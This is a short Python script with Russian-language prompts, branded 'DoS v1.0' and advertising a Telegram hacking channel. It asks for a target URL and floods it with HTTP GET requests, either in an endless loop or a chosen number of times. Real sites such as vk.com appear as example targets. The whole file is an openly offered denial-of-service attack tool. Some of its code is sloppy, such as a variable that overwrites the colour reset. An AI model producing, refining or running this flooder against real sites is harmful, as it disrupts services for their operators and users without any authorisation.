from colorama import init
from colorama import Fore, Back, Style
import requests
import os

init()

# Если решился пошарится тут скажу сразу тут нечего интересного) by Mak

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
mag =  Fore.MAGENTA
cyan = Fore.CYAN
res = Style.RESET_ALL

ok = f"{red}OK!"

def dos_1(site):
	while True:
		try:
			res = requests.get(site)
			print(f"{green}Пакет отправлен!  {res}")

		except requests.exceptions.ConnectionError:
			print(f"{red}Нет соеденения с сайтом!{res}")

def dos_2(site, thread):
	thread = int(threads)
	for i in range(0, thread):
		try:
			res = requests.get(site)
			print(f"{red}{i} {green}Пакет отправлен!  {res}")

		except requests.exceptions.ConnectionError:
			print(f"{red}Нет соеденения с сайтом!{res}")

def clr():
    os.system('cls' if os.name=='nt' else 'clear')

while True:
	clr()
	print(f"""{green}
 ___                        _    _ 
| __>._ _ _  ___  _ _  ___ | | _| |
| _> | ' ' |/ ._>| '_><_> || |/ . |
|___>|_|_|_|\\___.|_|  <___||_|\\___| 
                                   
    					DoS v1.0


{red}Telegramm
Channel: t.me/haxerchannel
Creator: @Mak_Sweet{res}

	""")
	print(f"{mag}Перед началом нужно выбрать какую категорию вы хотите:\n\n1. Более медленную(Но надёжную)		2. Более быструю(Но в какой-то мере не надёжную)")
	print(yellow)
	tool = input(str("Выбор: "))

	if tool == "1":
		print(f"{red}Обязательно нужно писать url сайта вот так например: http://vk.com, https://vk.com.{yellow}")
		url = input("URL: ")
		dos_1(url)

	elif tool == "2":
		print(f"{red}Обязательно нужно писать url сайта вот так например: http://vk.com, https://vk.com.{yellow}")
		url = input("URL: ")
		threads = input("Повторы: ")
		dos_2(url, threads)